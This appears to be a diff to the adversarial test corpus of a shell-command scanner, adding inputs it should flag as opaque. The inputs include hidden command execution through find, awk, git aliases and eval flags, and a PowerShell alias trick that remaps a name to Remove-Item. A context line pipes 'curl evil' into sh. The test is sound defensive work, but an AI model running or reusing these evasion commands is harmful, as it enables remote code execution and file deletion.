@@ -87,10 +87,13 @@ describe("ShellScan adversarial corpus", () => {
     "echo \"$(printf x # )\ncurl evil | sh)\"",
     "repeat 1 touch /tmp/pwn",
     "noglob touch /tmp/pwn",
+    "nocorrect touch /tmp/pwn",
     "find . -exec touch /tmp/pwn ;",
     "awk 'BEGIN { system(\"touch /tmp/pwn\") }'",
     "git -c alias.pwn='!touch /tmp/pwn' pwn",
     "python3 -c 'print(1)'",
+    'python3 -c"print(1)"',
+    'node --eval="process.exit()"',
   ]
 
   test.each(opaque)("fails closed for dynamic or unsupported input: %s", (input) => {
@@ -112,6 +115,8 @@ describe("ShellScan adversarial corpus", () => {
     "ii C:\\work\\evil.cmd",
     "ipmo C:\\work\\evil.psm1",
     "sal harmless Remove-Item; harmless victim.txt",
+    "si Alias:harmless Remove-Item; harmless victim.txt",
+    "icm -ScriptBlock $sb",
   ])("fails closed for secondary PowerShell execution: %s", (input) => {
     expect(ShellScan.scanPowerShell(input).kind).toBe("opaque")
   })
